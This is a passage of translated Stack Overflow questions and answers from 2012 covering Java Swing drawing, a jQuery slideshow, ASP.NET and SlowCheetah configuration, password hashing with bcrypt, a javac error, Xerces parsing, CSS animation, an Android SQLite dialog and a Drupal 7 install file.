## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T20:51:18.473

您可以像这样绘制到 BufferedImage：

```
public BufferedImage createSkelethonizationImage() {
   BufferedImage image = new BufferedImage(width, height);
   Graphics2D g2 = image.createGraphics();

   // Perform your drawing here
   g2.drawLine(...);

   g2.dispose();
   return image;
} 
```

要绘制图像，请创建一个扩展 JComponent 并覆盖 paint 方法的新类。这是一些入门代码：

```
public class MyImage extends JComponent {
   // Note: the image should be modified on the Event Dispatch Thread
   private BufferedImage image = createSkelethonizationImage();

   @Override
   public void paint(Graphics g) {
      g.drawImage(image, 0, 0, this);
   }
} 
```

编辑 - 完整的解决方案：

```
public class Test {

    public static void main(String[] args) {
       // Width and height of your image
       final int width = 200;
       final int height = 200;

       SwingUtilities.invokeLater(new Runnable() {

          @Override
          public void run() {
             JFrame frame = new JFrame();
             MyImage image = new MyImage(width, height);
             frame.add(image);
             frame.setSize(new Dimension(width, height));
             frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
             frame.setVisible(true);            
          }
       });
    }
}

class MyImage extends JComponent {

    // Note: image should be modified on the Event Dispatch Thread only
    private final BufferedImage image;

    public MyImage(int width, int height) {
       image = createSkelethonizationImage(width, height);
       setPreferredSize(new Dimension(width, height));
    }

    public BufferedImage createSkelethonizationImage(int width, int height) {
       BufferedImage iamge = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
       Graphics2D g2 = iamge.createGraphics();

       // Perform your drawing here
       g2.setColor(Color.BLACK);
       g2.drawLine(0, 0, 200, 200);

       g2.dispose();
       return iamge;
    }

    @Override
    public void paint(Graphics g) {
       g.drawImage(image, 0, 0, this);
    }
} 
```

# jquery - jquery.jmslideshow.js 如何停止然后到达终点

> ID：10305576
> 
> 赞同：0
> 
> 时间：2012-04-24T20:31:47.390
> 
> 标签：jquery, jquery-plugins, slideshow, impress.js

尝试使用我网站上 codrops 教程中漂亮的[jquery.jmslideshow.js](http://tympanus.net/codrops/2012/04/05/slideshow-with-jmpress-js/) [，](https://github.com/shama/jmpress.js)但不熟悉 jquery。

一个问题，-如何在最后一张幻灯片上启用自动播放选项来停止 jmpress 滑块？一旦它到达最后一张幻灯片。

希望这对你们中的一个人来说是一个简单的问题，对我来说是一个很好的 jquery howto。如果有人可以提供帮助，将不胜感激。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T02:44:26.763

我和你一样遇到了问题，这就是我让它发挥作用的方式。

而不是`jmpress.min.js`, 导入`impress.js`以提高可读性。然后搜索“圆形”一词。这是实际重复它的部分。

寻找这件作品：

```
do {
    var item = step.near( stepSelector, prev );

    if (item.length === 0 || item.closest(jmpress).length === 0) {
        console.log(item);
    }

    if (!item.length) {
        return false;
    }

    step = item;

} while( step.data("stepData").exclude );

return step; 
```

现在删除第一个 if 中写的任何内容，您就可以开始了。幻灯片现在停止在最后。

# asp.net - 500 - Web 服务内部错误

> ID：10305583
> 
> 赞同：1
> 
> 时间：2012-04-24T20:32:41.950
> 
> 标签：asp.net, web-services, iis-7.5

我最近刚从共享主机切换到 GoDaddy 上的 vps。我有一个在共享主机上运行良好的网络服务。我试图让它在我的 vps 下工作。转到链接时，我不断收到 500 - 内部错误。

我确实将它设置为 IIS 中的应用程序，并使用集成管道创建了自己的应用程序池。

关于其他可能导致此问题的任何想法？

编辑1：如果我将我的应用程序池切换为使用与我的站点相同的应用程序池，我会收到此错误：“解析器错误描述：解析服务此请求所需的资源时出错。请查看以下内容特定的解析错误详细信息并适当地修改您的源文件。

解析器错误消息：页面必须有 <%@ webservice class="MyNamespace.MyClass" ... %> 指令。

源错误：

第1行：这是预编译工具生成的标记文件，不要删除！

源文件：/webservices/namesearch.asmx 行：1"

这是我的 web.config

```
<?xml version="1.0"?>
<configuration>
  <appSettings/>
  <connectionStrings/>
  <system.web>

 <compilation debug="true" targetFramework="4.0"/>
<!--
  The <authentication> section enables configuration 
  of the security authentication mode used by 
  ASP.NET to identify an incoming user. 
-->
    <authentication mode="Windows"/>
      <customErrors mode="Off"/>

      <!--
       The <customErrors> section enables configuration 
       of what to do if/when an unhandled error occurs 
       during the execution of a request. Specifically, 
       it enables developers to configure html error pages 
       to be displayed in place of a error stack trace.

       <customErrors mode="RemoteOnly" defaultRedirect="GenericErrorPage.htm">
         <error statusCode="403" redirect="NoAccess.htm" />
         <error statusCode="404" redirect="FileNotFound.htm" />
       </customErrors>
    -->
    <pages controlRenderingCompatibilityVersion="4.0" clientIDMode="AutoID"/>
  </system.web>
  <!-- 
        The system.webServer section is required for running ASP.NET AJAX under Internet
        Information Services 7.0\.  It is not necessary for previous version of IIS.
    -->
</configuration> 
```

编辑2：所以我注意到那个解析器错误也说“源错误：

第1行：这是预编译工具生成的标记文件，不应该删除！”

所以我试图对网络服务进行预编译。当我这样做时，我收到错误消息“使用注册为 allowDefinition='machinetoapplication' 的部分超出应用程序级别是错误的。此错误可能是由于虚拟目录未在 iis 中配置为应用程序造成的”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T22:34:44.197

我刚刚使用[SoapClient](http://www.soapclient.com/soaptest.html)来访问[您的 Web 服务](http://www.politicprofiles.com/webservices/namesearch.asmx)。它使我们能够快速[为您的 Web 服务提供参数](http://www.soapclient.com/soapclient?template=/clientform.html&fn=soapform&SoapTemplate=/SoapResult.html&SoapWSDL=http://www.politicprofiles.com/webservices/namesearch.asmx?WSDL&_ArraySize=2)。

怀疑您的错误出`NameSearch.asmx.cs:line 29`在您可能尝试写入或读取事件日志（特别是安全日志）的位置。可能`EventLog.WriteEntry()`。

这里的问题是，在幕后，您的电话试图在`VerifyAndCreateSource()`没有适当授权的情况下进行。

要解决此问题，请授予安全事件日志适当的权限。运行的用户上下文可能在 NetworkService 下。

考虑实施[IIS7 中的步骤：Web 应用程序写入事件日志会生成安全异常](http://www.christiano.ch/wordpress/2009/12/02/iis7-web-application-writing-to-event-log-generates-security-exception/)。这里的主要思想是允许网络服务或您的应用程序在其下运行的任何安全上下文，允许写入注册表项

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog 
```

![在此处输入图像描述](../Images/67b43ff9249d06c5b43c1b713618d349.png)

.NET 代码中引发的完整错误是：

> System.Web.Services.Protocols.SoapException：服务器无法处理请求。---> System.Security.SecurityException：找不到源，但无法搜索部分或全部事件日志。要创建源，您需要读取所有事件日志的权限，以确保新的源名称是唯一的。无法访问的日志：安全性。在 System.Diagnostics.EventLogInternal.FindSourceRegistration（字符串源，字符串 machineName，布尔只读，布尔值 wantToCreate）在 System.Diagnostics.EventLogInternal.SourceExists（字符串源，字符串机器名，布尔值 wantToCreate）在 System.Diagnostics.EventLogInternal.VerifyAndCreateSource（字符串源名, String currentMachineName) 在 System.Diagnostics.EventLogInternal.WriteEntry(String message, EventLogEntryType type, Int32 eventID, Int16 category, Byte[] rawData) 在 System.Diagnostics。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:37:49.057

要确定错误发生在代码中的哪个位置，请编辑 web.config 以包括：

```
<system.web>
    <customErrors mode="Off"/>
</system.web> 
```

# maven - 如何在 IntelliJ 中启动 Tomcat 之前运行多个 Maven 目标

> ID：10305587
> 
> 赞同：3
> 
> 时间：2012-04-24T20:32:50.680
> 
> 标签：maven, intellij-idea

在 IntelliJ 中 Tomcat Server 的运行配置中，您可以指定 Run Maven Goal，但不能选择多个目标。我想将多个目标都作为同一个 java 进程运行，以便它们可以共享由其中一个目标生成的属性。[特别是由内部版本号 maven plugin](http://mojo.codehaus.org/buildnumber-maven-plugin/hgchangeset-mojo.html)创建的 ${changeSet} 属性。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:46:29.883

此功能已经实现，将在下一次 IDEA 更新中提供：

![新用户界面](../Images/20e01f27f33c655f2816842c16bedcd3.png)

这样的 UI 允许以用户指定的顺序运行任意数量的自定义任务，包括 Maven 目标。

另一种解决方案是使用类似[Mojo Executor](https://github.com/TimMoore/mojo-executor)的东西。

# python - 保存散列密码 - 安全吗？

> ID：10305591
> 
> 赞同：1
> 
> 时间：2012-04-24T20:34:02.933
> 
> 标签：python

像这样的 Python 脚本可以安全使用吗？磁盘上会有一个文件“theFile”：

```
myPassHash = theFile.read()
enteredPassword = raw_input("Enter your password: ")
enteredHash = hashlib.sha512(enteredPassword)
if myPassHash == enteredHash:
    print "Correct!"
else:
    print "Incorrect!" 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-24T20:36:54.430

这看起来很容易受到彩虹表攻击，因为你没有加盐密码。

有关盐的更多信息（以及为什么推出自己的身份验证机制是个坏主意），请阅读Eric Lippert 的关于密码[加盐的精彩系列。](http://blogs.msdn.com/b/ericlippert/archive/tags/salt/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T20:36:45.717

如果您打算对密码使用散列算法，您可能还想使用盐。看看这篇关于盐的文章：http: [//www.codinghorror.com/blog/2007/09/youre-probably-storing-passwords-incorrectly.html](http://www.codinghorror.com/blog/2007/09/youre-probably-storing-passwords-incorrectly.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-24T21:24:02.250

您不应该使用像 SHA-2 这样的通用哈希算法来存储密码，即使使用盐也是如此。盐可以保护你免受彩虹桌的伤害，但它们不会保护你免受暴力攻击。如今，任何拥有信用卡的人都可以轻松地进行处理，如果您的数据库遭到破坏，即使使用盐，也有人可以轻松破解选择不当的密码。

为存储密码而创建了特定的哈希函数。不同之处在于，它允许您调整用于生成散列的加密算法的周期数，因此它的成本有多大，或者需要多长时间。这使得蛮力攻击变得更加困难，即使在更快的计算机可用时也是如此。

其中之一是[bcrypt ，可在](http://static.usenix.org/events/usenix99/provos/provos_html/index.html)[此处](http://pypi.python.org/pypi/py-bcrypt/)用于 Python ：

```
>>> import bcrypt
>>> h = bcrypt.hashpw('lero', bcrypt.gensalt(10))
>>> j = bcrypt.hashpw('lero', bcrypt.gensalt(12))
>>> h
'$2a$10$FhdV1LfOPfxvHcwbWSZLiupbUL8i.som6GyqWue6VBwVgKK9cZcRi'
>>> j
'$2a$12$bgZ1eFD/VTGWUtA8jhnUcO7JjpIpBRjbNpQ9DcYQvtyQV4XsjAXU6'
>>> 
```

对 bcrypt.gensalt() 的调用决定了生成的哈希有多复杂。正如你所看到的，它们都生成了一个哈希，但是使用 bcrypt.gensalt(12) 的调用需要更长的时间。随着计算机变得越来越快，您可以不时增加它并重新生成哈希，因此暴力攻击将永远不会有效。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-24T20:37:54.920

看看这样的东西

[http://net.tutsplus.com/tutorials/php/understanding-hash-functions-and-keeping-passwords-safe/](http://net.tutsplus.com/tutorials/php/understanding-hash-functions-and-keeping-passwords-safe/)

这是 PHP，但它的应用相同。你至少需要盐

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-14T02:04:38.093

使用[passlib](https://code.google.com/p/passlib/)，不要编写自己的密码加密/检查代码。

# java - 错误：“仅当显式请求注释处理时才接受类名”

> ID：10305592
> 
> 赞同：16
> 
> 时间：2012-04-24T20:34:04.443
> 
> 标签：java, compilation, javac

> **可能重复：**
> [Java 编译问题：仅当显式请求注释处理时才接受类名](https://stackoverflow.com/questions/5063266/java-compile-problem-class-names-are-only-accepted-if-annotation-processing-is)

我遇到了一个问题。我正在使用深红色编辑器。有人可以解释这个错误是什么意思吗？

// 这是我的程序

```
package test.rim.bbapps.testcase.lib;
import java.awt.*;
import java.awt.event.*;
import javax.swing.*;

public class michaeltictactoe2 implements ActionListener {

    /* Instance variables */

    private JFrame window = new JFrame (" TicTacToe");
    private JButton button1 = new JButton ("") ;
    private JButton button2 = new JButton ("") ;
    private JButton button3 = new JButton ("") ;
    private JButton button4 = new JButton ("") ;
    private JButton button5 = new JButton ("") ;
    private JButton button6 = new JButton ("") ;
    private JButton button7 = new JButton ("") ;
    private JButton button8 = new JButton ("") ;
    private JButton button9 = new JButton ("") ;
    private String letter = "";
    private int count = 0; 
    private boolean win = false; 

    public michaeltictactoe2 () {
        //* Create Window * /
        window.setSize (300,300);
        window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        window.setLayout ( new GridLayout (3, 3));

        /* Adding buttons to the window*/
        window.add(button1);
        window.add(button2);
        window.add(button3);
        window.add(button4);
        window.add(button5);
        window.add(button6);
        window.add(button7);
        window.add(button8);
        window.add(button9);

        /* Add the action listener to the Button */
        button1.addActionListener(this);
        button2.addActionListener(this);
        button3.addActionListener(this);
        button4.addActionListener(this);
        button5.addActionListener(this);
        button6.addActionListener(this);
        button7.addActionListener(this);
        button8.addActionListener(this);
        button9.addActionListener(this);

        //* make the window visible * /
        window.setVisible (true) ;
    }

    public void actionPerformed (ActionEvent a) {
        count++;

        /* Calculate who's turn it is */
        if (count == 1 || count == 3|| count == 5 || count == 7 || count == 9) {
            letter = "X"; 
        } else if ( count == 2 || count == 4 || count  == 6 || count == 8  ) {
            letter = "O";   
        }

        /* Display X's or O's on the buttons */
        if ( a.getSource () == button1) {
            button1.setText ( letter ) ;
            button1.setEnabled (false);
        } else if (a.getSource () == button2) {
            button2.setText(letter);
            button2.setEnabled(false); 
        } else if (a.getSource () == button3) {
            button3.setText(letter);
            button3.setEnabled(false); 
        } else if (a.getSource () == button4) {
            button4.setText(letter);
            button4.setEnabled(false); 
        } else if (a.getSource () == button5) {
            button5.setText(letter);
            button5.setEnabled(false); 
        } else if (a.getSource () == button6) {
            button6.setText(letter);
            button6.setEnabled(false); 
        } else if (a.getSource () == button7) {
            button7.setText(letter);
            button7.setEnabled(false); 
        } else if (a.getSource () == button8) {
            button8.setText(letter);
            button8.setEnabled(false); 
        } else if (a.getSource () == button9) {
            button9.setText(letter);
            button9.setEnabled(false);
        }

        // * Determine who won */
        // horizontal wins
        if ( button1.getText () == button2.getText ()
            && button2.getText () == button3.getText ()
            && button1.getText () != "") {

            win = true;

        } else if ( button4.getText () == button5.getText ()
                    && button5.getText () == button6.getText ()
                    && button4.getText () != "") {
            win = true;

        } else if ( button7.getText () == button8.getText ()
                &&    button8.getText () == button9.getText ()
                &&    button7.getText () != "") {
                win = true;

            // Verticle wins 
        } else if (button1.getText() == button4.getText ()
               && button4.getText() == button7.getText ()
               && button1.getText() != "") {
               win = true; 

        } else if (button2.getText() == button5.getText()
                &&  button5.getText() == button8.getText()
                &&  button2.getText() != "") {
               win = true;
        } else if ( button3.getText() == button6.getText()
                &&   button6.getText() == button9.getText()
                &&   button9.getText() != "") {
               win = true ;

        // Diagonal wins 
        } else if (button1.getText() == button5.getText()
                && button5.getText() == button9.getText()
                && button1.getText() != "") {
                win = true; 

         } else if (button3.getText() == button5.getText()
                 && button5.getText() == button7.getText()
                 && button3.getText() != "") {
                win = true;
         } else {
                win = false ;
         }

        /* show a dialog is someone wins or the game is tie*/
        if ( win == true) {
            JOptionPane.showMessageDialog(null, letter + " YOU WIN!");
        } else if (count == 9 && win == false) {
            JOptionPane.showMessageDialog ( null , " Tie Game!" ) ;  
        }
    }

    public static void main (String [] args) {
        new michaeltictactoe2 () ;
    }
} 
```

这是错误

```
---------- Capture Output ----------
> "C:\Program Files\Java\jdk1.6.0_22\bin\javac.exe" michaeltictactoe2
error: Class names, 'michaeltictactoe2', are only accepted if annotation processing is explicitly requested
1 error

> Terminated with exit code 1. 
```

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-04-24T20:36:20.827

您忘记在编译命令中包含 .java ：

```
javac michaeltictaxtoe2.java
                       ^^^^^ add this 
```

# c++ - 使用 XercesDOMParser 解析时出现意外异常

> ID：10305594
> 
> 赞同：1
> 
> 时间：2012-04-24T20:34:09.577
> 
> 标签：c++, xml, xml-parsing, xerces-c

我正在使用 xerces-c-3.1.1-x86-windows-vc-10.0 在 Windows 7 Professional SP1 上使用 MS Developer Studio 10.0.4 在 C++ 中开发代码。我使用以下代码从[这里](http://xerces.apache.org/xerces-c/program-sax-3.html)打开和关闭 XML 文件。

```
try
{
    XMLPlatformUtils::Initialize();
}
catch (const XMLException& toCatch) 
{
    char* message = XMLString::transcode(toCatch.getMessage());
    cout << "Error during initialization! :\n"
            << message << "\n";
    XMLString::release(&message);
    return ERROR_PARAMETERS;
}

// Determine xml file name
xmlsFileName.assign(fileName);      

XercesDOMParser* parser = new XercesDOMParser();
parser->setValidationScheme(XercesDOMParser::Val_Always);
parser->setDoNamespaces(true); 

ErrorHandler* errHandler = (ErrorHandler*) new HandlerBase();
parser->setErrorHandler(errHandler);

try 
{
    parser->parse(xmlsFileName.c_str());
}
catch (const XMLException& toCatch) 
{
    char* message = XMLString::transcode(toCatch.getMessage());
    cout << "Exception message is: \n"
            << message << "\n";
    XMLString::release(&message);
    return ERROR_PARAMETERS;
}
catch (const DOMException& toCatch) 
{
    char* message = XMLString::transcode(toCatch.msg);
    cout << "Exception message is: \n"
            << message << "\n";
    XMLString::release(&message);
    return ERROR_PARAMETERS;
}
catch (...) 
{
    cout << "Unexpected Exception \n" ;
    return ERROR_PARAMETERS;
}

// Some more code

delete parser;
delete errHandler; 
```

输入的 XML 文件具有命名序列`rootname-00000.xml`,`rootname-00001.xml`等。一切正常，直到我到达`rootname-03799.xml`那一点

```
parser->parse(xmlsFileName.c_str()); 
```

parser->parse(xmlsFileName.c_str()) 失败；

如果我将其名称更改为`rootname-00000.xml`我没有问题，那么文件格式似乎没有问题。另外，我每次都删除解析器和错误处理程序，所以看起来我不应该用完任何东西。

任何有关此问题的帮助将不胜感激

# css - 像在 Windows 7 中一样，让一些渐变在进度条中无休止地移动

> ID：10305596
> 
> 赞同：12
> 
> 时间：2012-04-24T20:34:13.083
> 
> 标签：css, css-transitions

我想知道是否可以仅使用 CSS3 功能在 div 内从左到右无休止地进行渐变移动？不需要支持所有浏览器，我只是想试验一下。示例是蓝色进度条顶部的闪亮效果。一个例子值得赞赏。

![在此处输入图像描述](../Images/6958ceb685bed9610a36f6b12a46512b.png)

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-04-24T20:58:58.890

使用此 CSS，您可以让渐变无休止地移动（基于Michael 评论中的[链接）：](http://www.alldesignstuffs.com/2011/creating-css3-animation-using-css3-gradient-and-background-cliptext/)

```
.bar {
    background: -webkit-linear-gradient(left , #0193CD 30%, #66D4E5 80%, #0193CD 100%) repeat;
    -webkit-background-size: 50% 100%;
    -webkit-animation-name: moving-gradient;
    -webkit-animation-duration: 1s;
    -webkit-animation-iteration-count: infinite;
    -webkit-animation-timing-function: linear;
}

@-webkit-keyframes moving-gradient {
    0% {
        background-position: left bottom;
    }

    100% {
        background-position: right bottom;
    }
}​ 
```

**演示：http:** [//jsfiddle.net/jhogervorst/X78qN/2/](http://jsfiddle.net/jhogervorst/X78qN/2/)

这仅适用于基于 WebKit 的浏览器（例如，Safari 和 Chrome）。要使其在其他浏览器中也能正常工作，请参阅[Michael 的链接](http://www.alldesignstuffs.com/2011/creating-css3-animation-using-css3-gradient-and-background-cliptext/)并复制更多 CSS。

**编辑：**我必须使它完美。在 CSS3 中查看几乎完美的 Windows 进度条的新演示 :)

# asp.net - SlowCheetah 不在 CI 服务器上生成转换后的配置文件

> ID：10305602
> 
> 赞同：5
> 
> 时间：2012-04-24T20:35:01.117
> 
> 标签：asp.net, msbuild, slowcheetah

我正在使用 SlowCheetah 在 CI 服务器上的 Visual Studio Web 项目中转换 XML 配置文件。在 Visual Studio 2010 中，当我发布时 XML 会很好地转换，但在 CI 服务器上不会发生转换。相反，我只得到原始的未转换的配置文件。我按照[Sayed Ibrahim 的博客](http://sedodream.com/2011/12/12/SlowCheetahXMLTransformsFromACIServer.aspx)提供的说明进行操作，他解释了在解决方案中添加 SlowCheetah dll 和目标文件，并指向项目文件以使用这些文件。我进行了此更改并在 Visual Studio 中进行了发布，以确保它有效并且确实有效。但是当我在 CI 服务器上构建项目时，我遇到了同样的问题。

我的假设是它与我用来在 CI 服务器上构建项目的 MSBuild 脚本有关。我需要添加一些东西来告诉我的项目使用 SlowCheetah 吗？我的构建脚本如下：

```
<Project DefaultTargets="DoPublish"
xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<PropertyGroup>
    <SourceFileRootFolder>$(CCNetWorkingDirectory)\Code</SourceFileRootFolder>
    <WebFolder>DCSIWeb\DCSIWeb</WebFolder>
    <ReleaseFolder>C:\Builds\BuildFolder</ReleaseFolder>
</PropertyGroup>
<PropertyGroup Condition ="$(CCNetWorkingDirectory) == ''">
    <SourceFileRootFolder>C:\Builds\ProjectWorkingDirectory\Code</SourceFileRootFolder>
    <ReleaseFolder>C:\Builds\BuildFolder</ReleaseFolder>
</PropertyGroup>
<Target Name="CleanSource">
    <Message Text="Removing all source files from $(ReleaseFolder)" />
    <RemoveDir Directories="$(ReleaseFolder)" />
</Target>
<Target Name="DoPublish">
    <CallTarget Targets="CleanSource"/>
    <MSBuild Projects="$(SourceFileRootFolder)\DCSIWeb.sln" Targets="Clean;Build" />
    <MSBuild Projects="$(SourceFileRootFolder)\$(WebFolder)\DCSIWeb.csproj"
        Targets="_CopyWebApplication;_BuiltWebOutputGroupOutput;TransformWebConfig"
        Properties="OutDir=$(ReleaseFolder)\" ></MSBuild>
</Target> 
```

MSBuild 脚本基本上构建项目并将项目放入“c:\Builds\BuildFolder”。当我在构建完成后查看构建文件夹时，我看到了我需要的 .config 文件，但没有发生任何转换。它与之前的文件相同。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-20T22:42:12.533

尝试使用 2.5.10 版本。我已经修改了 SlowCheetah 以将 .targets 文件添加到项目中。现在不需要额外的配置。更多信息请访问[https://github.com/sayedihashimi/slow-cheetah/issues/113](https://github.com/sayedihashimi/slow-cheetah/issues/113)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T15:14:47.957

我总是不喜欢那种答案，但我建议您使用[Config Transformation Tool](http://ctt.codeplex.com/)。它是另一个使用 Xdt 转换的工具，但它比 Cheetah 简单得多，而且有点聪明（支持参数）然后是严肃的 MSBuild 任务。它可以直接存储在解决方案中，也可以通过 NuGet 包在 CI 服务器上自动恢复。您只需要使用参数调用实用程序。我是 Xdt 的粉丝，因为 in 被制作出来并发现这个工具在我的项目中最容易使用。

# android - 与 SQLite 数据库中的数据对话

> ID：10305607
> 
> 赞同：0
> 
> 时间：2012-04-24T20:35:18.823
> 
> 标签：android, sqlite, dialog

我有一个酒店的列表视图，我希望当用户长按某个项目时，会出现一个对话框，其中包含从 SQLite 数据库中检索到的所点击酒店的信息（位置、地址、电话号码等）。我从列表中的数据库中检索数据。在我将列表转换为 toString() 时的对话框消息中，结果有多余的方括号，例如：电话：[02239348]，我该怎么办？还有其他方法吗？

这是 DataSource.java 中的代码，它从数据库中检索位置：

```
 public List<Hotel> getHotelLocation(String hotelName) {
    List<Hotel> hotels = new ArrayList<Hotel>(); 
    Cursor cursor = database.query(MySQLiteHelper.TABLE_Hotel, 
            hotelsLoc, hotelsNames[0] + " like " + "'" + hotelName + "'", null, null, null, null);
    cursor.moveToFirst();
    while (!cursor.isAfterLast()) {
        Hotel hotel = cursorToHotel(cursor);
        hotels.add(hotel);
        cursor.moveToNext();
    }
    // Make sure to close the cursor
    cursor.close();
    return hotels;
}

private Hotel cursorToHotel(Cursor cursor) {
    // TODO Auto-generated method stub
    Hotel hotelname = new Hotel();
        hotelname.setName(cursor.getString(0));
    return hotelname;
} 
```

这是警报对话框：

```
public boolean onItemLongClick(AdapterView<?> parent, View view, int position,
        long id) {
    // TODO Auto-generated method stub
    String hotelName = (String) ((TextView)parent.getChildAt(position)).getText();
    List<Hotel> location = datasource.getHotelLocation(hotelName);
    String loc = "Location: " + location.toString();
    List<Hotel> address = datasource.getHotelAddress(hotelName);
    String add = "Address: " + address.toString();
    List<Hotel> rating = datasource.getHotelRating(hotelName);
    String rat = "Rating: " + rating.toString();
    List<Hotel> phone = datasource.getHotelPhone(hotelName);
    String phoneN = "Phone: " + phone.toString();
    AlertDialog.Builder builder = new AlertDialog.Builder(this);
    builder.setTitle("Information about " + hotelName);
    builder.setMessage(loc + "\n" + add + "\n" + rat + "\n" + phoneN + "\n");
            builder.setCancelable(true);
    builder.show();
    return false;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:47:03.283

您可以将列表加入到一个字符串中，`TextUtils.join(", ", theList)`或​​者您可以简单地使用列表的第一项 ( `theList.get(0)`) 如果足够的话。

```
List<Hotel> phone = datasource.getHotelPhone(hotelName);
String phoneN = "Phone: " + TextUtils.join(", ", phone); 
```

如果电话有多个条目，它应该打印`"Phone: 12343, 3424323, 19393"`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T20:48:47.657

您正在对 List 使用 toString() 方法，并且该 List 的默认实现可能使用“[”元素“]”。

你想打印列表的第一个元素吗？只需在您的 Hotel 类中覆盖 toString() 即可使用它们

```
phone.get(0).toString() 
```

问候

# php - Drupal 7 中的自定义内容类型 - 我的标题在哪里？

> ID：10305609
> 
> 赞同：1
> 
> 时间：2012-04-24T20:35:35.063
> 
> 标签：php, drupal-7, drupal-modules

我正在以编程方式在 Drupal 7 模块中创建自定义内容类型。我已经按照示例进行了操作，但是由于某种原因，安装后，内容类型列表下没有显示内容类型，并且在创建课程类型的内容时，没有输入标题的地方。

我究竟做错了什么？

这是我的 course.install 文件：

```
<?php
function course_schema()
{
    $schema['course_status'] = array('description' => t('Stores user specific course status information.'),
                                     'fields'      => array('id'           => array('description' => t('The primary identifier'),
                                                                                    'type'        => 'serial',
                                                                                    'unsigned'    => TRUE,
                                                                                    'not null'    => TRUE),
                                                            'uid'          => array('description' => t('The user identifier.'),
                                                                                    'type'        => 'int',
                                                                                    'unsigned'    => TRUE,
                                                                                    'not null'    => TRUE,
                                                                                    'default'     => 0),
                                                            'nid'          => array('description' => t('The node identifier.'),
                                                                                    'type'        => 'int',
                                                                                    'unsigned'    => TRUE,
                                                                                    'not null'    => TRUE,
                                                                                    'default'     => 0),
                                                            'visits'       => array('description' => t('The visit count.'),
                                                                                    'type'        => 'int',
                                                                                    'unsigned'    => TRUE,
                                                                                    'not null'    => TRUE,
                                                                                    'default'     => 0),
                                                            'is_completed' => array('description' => t('The completion flag.'),
                                                                                    'type'        => 'int',
                                                                                    'unsigned'    => TRUE,
                                                                                    'not null'    => TRUE,
                                                                                    'default'     => 0),
                                                            'completed_at' => array('description' => t('The completion date, as a timestamp.'),
                                                                                    'type'        => 'int',
                                                                                    'default'     => NULL)),
                                     'primary key' => array('id'));

    return $schema;
}

function course_install()
{
    // During installation, the t() function is unavailable, so we use get_t()
    // to store the name of the translation function.
    $t = get_t();

    // We define the node type as an associative array.
    $course = array('type'        => 'course',
                    'name'        => $t('Course'),
        // 'base' tells Drupal the base string for hook functions.
        // This is often the module name; if base is set to 'mymodule', Drupal
        // would call mymodule_insert() or similar for node hooks.
        // In this case, we set base equal to 'node_content' so Drupal will handle
        // our node as if we had designed it in the UI.
                    'base'        => 'node_content',
                    'description' => $t('This is a course node.'),
                    'title_label' => $t('Title'),
                    'custom'      => TRUE,);

    // Complete the node type definition by setting any defaults not explicitly
    // declared above.
    // http://api.drupal.org/api/function/node_type_set_defaults/7
    $content_type = node_type_set_defaults($course);

    //Course blocks have an image, and body.
    node_add_body_field($content_type, $t('Description'));

    // Save the content type
    node_type_save($content_type);

    // Create all the fields we are adding to our content type.
    // http://api.drupal.org/api/function/field_create_field/7
    foreach(_course_installed_fields() as $field)
    {
        field_create_field($field);
    }

    // Create all the instances for our fields.
    // http://api.drupal.org/api/function/field_create_instance/7
    foreach(_course_installed_instances() as $instance)
    {
        $instance['entity_type'] = 'node';
        $instance['bundle']      = $course['type'];
        field_create_instance($instance);
    }

    //Don't show submitted info on course nodes
//  variable_set('node_submitted_course', 0);
}

/**
 * Returns a structured array defining the fields created by this content type.
 * This is factored into this function so it can be used in both
 * node_example_install() and node_example_uninstall().
 * @return
 *          An associative array specifying the fields we wish to add to our
 *          new node type.
 * @ingroup node_example
 */
function _course_installed_fields()
{
    $t = get_t();
    return array('course_image'         => array('field_name'  => 'course_image',
                                                 'type'        => 'image',
                                                 'cardinality' => 1,),
                 'course_curriculum_id' => array('field_name'        => 'course_curriculum_id',
                                                 'type'              => 'number_integer',
                                                 'settings'          => array('max_length' => 9),
                                                 'cardinality'       => 1,));
}

/**
 * Returns a structured array defining the instances for this content type.
 * The instance lets Drupal know which widget to use to allow the user to enter
 * data and how to react in different view modes.  We are going to display a
 * page that uses a custom "node_example_list" view mode.  We will set a
 * cardinality of three allowing our content type to give the user three color
 * fields.
 * This is factored into this function so it can be used in both
 * node_example_install() and node_example_uninstall().
 * @return
 *          An associative array specifying the instances we wish to add to our new
 *          node type.
 * @ingroup node_example
 */
function _course_installed_instances()
{
    $t = get_t();
    return array('course_image'         => array('field_name'  => 'course_image',
                                                 'label'       => $t('Image:'),
                                                 'required'    => FALSE,
                                                 'widget'      => array('type'    => 'image_image',
                                                                        'weight'  => 2.10),
                                                 'display'     => array('course_list' => array('label' => 'hidden',
                                                                                               'type'  => 'image_link_content__thumbnail',))),
                 'course_curriculum_id' => array('field_name'  => 'course_curriculum_id',
                                                 'label'       => $t('Curriculum Id') . ':',
                                                 'required'    => TRUE,
                                                 'widget'      => array('type'              => 'text_textfield'),
                                                 'settings'    => array('text_processing' => 0),
                                                 'display'     => array('course_list' => array('label' => 'hidden',
                                                                                               'type'  => 'hidden'))));
}

function course_uninstall()
{
    // Drop my tables.
    drupal_uninstall_schema('course');

    //remove any nodes of the type course
    $sql    = 'SELECT nid FROM {node} n WHERE n.type = :type';
    $result = db_query($sql, array(':type' => 'course'));
    $nids   = array();
    foreach($result as $row)
    {
        $nids[] = $row->nid;
    }

